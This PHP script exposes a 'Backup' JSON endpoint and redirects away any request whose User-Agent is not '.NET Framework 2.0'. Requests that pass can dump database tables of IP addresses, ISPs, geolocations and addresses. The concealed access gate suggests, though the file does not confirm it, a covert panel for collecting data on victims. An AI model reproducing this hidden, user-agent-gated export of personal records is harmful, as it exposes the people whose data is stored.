<?php 

	require_once ("header.php");
	
	function getDomainHash(){
		$server = $_SERVER['SERVER_NAME'];
		$server = strtolower($server);	
		if(startsWith($server,'www.')) $server = substr($server, 4);
		return md5($server);
	}
	
	//421aa90e079fa326b6494f812ad13e79 localhost
	
	/*echo getDomainHash();
	exit;*/
	
	/*$name = md5(str_replace("www.","", $_SERVER['SERVER_NAME']));
	echo $name;
	exit;*/
	
	$agent = trim(@$_SERVER['HTTP_USER_AGENT']);
	if($agent != ".NET Framework 2.0") {
		unset($agent);
		header("Location: ".getCurrentHost());
		exit;
	}
	else unset($agent);
	
	class Backup{
		
		function countOwners(){
			$items = 0;
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
					
			$query = "SELECT COUNT(address) AS size FROM owners LIMIT 1";
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				$row = @mysql_fetch_array($result) or die(mysql_error());
				$items = $row["size"];
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $items;
		}
		
		function countAddress(){
			$items = 0;
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
					
			$query = "SELECT COUNT(address) AS size FROM address LIMIT 1";
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				$row = @mysql_fetch_array($result) or die(mysql_error());
				$items = $row["size"];
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $items;
		}
		
		function getOwners($init, $end){
			$list = array();
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
					
			$query = "SELECT * FROM owners LIMIT $init , $end";
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				while($row = @mysql_fetch_array($result)){
					$array = array();
					$array["ip"] = $row["ip"];
					$array["isp"] = $row["isp"];
					$array["city"] = $row["city"];
					$array["region"] = $row["region"];
					$array["country"] = $row["country"];
					$array["address"] = $row["address"];
					array_push($list, $array);
				}
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $list;
		}
		
		function getAddress($init, $end){
			$list = array();
			
			$link = @mysql_connect(getHOST(), getSID(), getPWR()) or die(mysql_error()); 
			@mysql_select_db(getDB(), $link) or die(mysql_error());
					
			$query = "SELECT * FROM address LIMIT $init , $end";
			$result = @mysql_query($query, $link) or die(mysql_error());
			$numRows = @mysql_num_rows($result);
			if($numRows >= 1){
				while($row = @mysql_fetch_array($result)){
					$array = array();
					$array["owner"] = $row["owner"];
					$array["address"] = $row["address"];
					array_push($list, $array);
				}
				@mysql_free_result ($result) or die(mysql_error());
			}
			@mysql_close($link) or die(mysql_error());
			
			return $list;
		}
		
	}
	
	$key = trim(@$_POST["key"]);
	$value = trim(@$_POST["value"]);
	
	if(strlen($key)>0){
		$key = trim(@json_decode($key));
		$value = trim(@json_decode($value));
		
		if(strlen($key) > 0){			
			$backup = new Backup;			
			if($key == "countOwners"){
				header("Content-type: application/json");
				$tmpVar = $backup->countOwners();
				$tmpVar = json_encode($tmpVar);
				echo $tmpVar;
				unset($backup);
				exit;
			}
			else if($key == "countAddress"){
				header("Content-type: application/json");
				$tmpVar = $backup->countAddress();
				$tmpVar = json_encode($tmpVar);
				echo $tmpVar;
				unset($backup);
				exit;
			}
			else if($key == "getOwners" && strlen($value)>0){
				$tmpVar = @explode(",", $value);
				if(count($tmpVar) == 2){
					$key = (int)trim($tmpVar[0]);
					$value = (int)trim($tmpVar[1]);
					if($key >= 0 && $value >= 0){
						header("Content-type: application/json");
						$tmpVar = $backup->getOwners($key, $value);
						$tmpVar = json_encode($tmpVar);
						echo $tmpVar;
						unset($backup);
						exit;
					}
				}
			}
			else if($key == "getAddress" && strlen($value)>0){
				$tmpVar = @explode(",", $value);
				if(count($tmpVar) == 2){
					$key = (int)trim($tmpVar[0]);
					$value = (int)trim($tmpVar[1]);
					if($key >= 0 && $value >= 0){
						header("Content-type: application/json");
						$tmpVar = $backup->getAddress($key, $value);
						$tmpVar = json_encode($tmpVar);
						echo $tmpVar;
						unset($backup);
						exit;
					}
				}
			}
		}
	}
	
	header("Location: ".getCurrentHost());
	exit;
	

?>